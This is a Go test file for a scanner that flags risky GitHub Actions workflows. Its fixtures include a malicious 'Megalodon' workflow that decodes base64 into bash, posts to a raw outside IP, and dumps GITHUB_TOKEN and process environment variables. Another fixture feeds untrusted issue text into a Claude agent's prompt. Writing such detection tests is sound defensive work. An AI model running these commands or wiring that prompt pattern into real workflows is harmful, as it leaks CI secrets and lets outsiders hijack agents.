package builtin

import (
	"testing"

	"github.com/harshmaur/audr/internal/parse"
)

func TestRule_GHAWriteAllPermissions(t *testing.T) {
	cases := []struct {
		name      string
		yaml      string
		wantFires int
	}{
		{
			name:      "top-level write-all fires",
			yaml:      "name: x\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: []\n",
			wantFires: 1,
		},
		{
			name:      "explicit minimal does not fire",
			yaml:      "name: x\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: []\n",
			wantFires: 0,
		},
	}
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			doc := parse.Parse("/repo/.github/workflows/x.yml", []byte(tt.yaml))
			fires := 0
			for _, id := range applyRule(doc) {
				if id == "gha-write-all-permissions" {
					fires++
				}
			}
			if fires != tt.wantFires {
				t.Errorf("got %d fires, want %d", fires, tt.wantFires)
			}
		})
	}
}

func TestRule_GHASecretsInAgentStep(t *testing.T) {
	yaml := `name: x
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: claude review
        uses: anthropics/claude-code-action@v1
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
`
	doc := parse.Parse("/repo/.github/workflows/x.yml", []byte(yaml))
	fires := 0
	for _, id := range applyRule(doc) {
		if id == "gha-secrets-in-agent-step" {
			fires++
		}
	}
	if fires == 0 {
		t.Errorf("expected secrets-in-agent-step to fire; rules fired: %v", applyRule(doc))
	}
}

func TestRule_GHABase64SecretExfilWorkflow_MegalodonOptimizeBuild(t *testing.T) {
	yaml := `name: Optimize-Build
on:
  workflow_dispatch:
permissions:
  id-token: write
  actions: read
jobs:
  optimize:
    runs-on: ubuntu-latest
    steps:
      - name: optimize runtime
        run: |
          echo "QVVESV9NRUdBTE9ET05fUFlMT0FEX1BBRERJTkc9eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eAo=" | base64 -d | bash
          curl --request POST http://216.126.225.129:8443/upload
          printenv GITHUB_TOKEN
          cat /proc/1/environ
`
	doc := parse.Parse("/repo/.github/workflows/docker-community-worker-push-latest.yml", []byte(yaml))
	if !fired(doc, "gha-base64-secret-exfil-workflow") {
		t.Fatalf("expected Megalodon workflow rule to fire; rules fired: %v", applyRule(doc))
	}
}

func TestRule_GHABase64SecretExfilWorkflow_BenignDecodeDoesNotFire(t *testing.T) {
	yaml := `name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: decode fixture
        run: |
          echo "QVVESV9CRU5JR05fRklYVFVSRV9QQURESU5HPXh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eAo=" | base64 -d | bash
`
	doc := parse.Parse("/repo/.github/workflows/build.yml", []byte(yaml))
	if fired(doc, "gha-base64-secret-exfil-workflow") {
		t.Fatalf("did not expect benign base64 decode workflow to fire; rules fired: %v", applyRule(doc))
	}
}

func TestRule_GHAClaudeIssueAgentInjection(t *testing.T) {
	yaml := `name: Issue Triage
on:
  issues:
    types: [opened]
permissions:
  issues: write
  contents: read
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: claude triage
        uses: anthropics/claude-code-action@v1
        with:
          allowed_non_write_users: ${{ github.event.issue.user.login }}
          prompt: |
            Triage this external issue:
            ${{ github.event.issue.title }}
            ${{ github.event.issue.body }}
`
	doc := parse.Parse("/repo/.github/workflows/issue-triage.yml", []byte(yaml))
	if !fired(doc, "gha-claude-issue-agent-injection") {
		t.Fatalf("expected Claude issue injection rule to fire; rules fired: %v", applyRule(doc))
	}
}

func TestRule_GHAClaudeIssueAgentInjection_BenignPullRequestReviewDoesNotFire(t *testing.T) {
	yaml := `name: Claude PR Review
on: [pull_request]
permissions:
  contents: read
  pull-requests: write
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - name: claude review
        uses: anthropics/claude-code-action@v1
        with:
          prompt: Review the checked out diff.
`
	doc := parse.Parse("/repo/.github/workflows/pr-review.yml", []byte(yaml))
	if fired(doc, "gha-claude-issue-agent-injection") {
		t.Fatalf("did not expect PR review workflow to fire; rules fired: %v", applyRule(doc))
	}
}
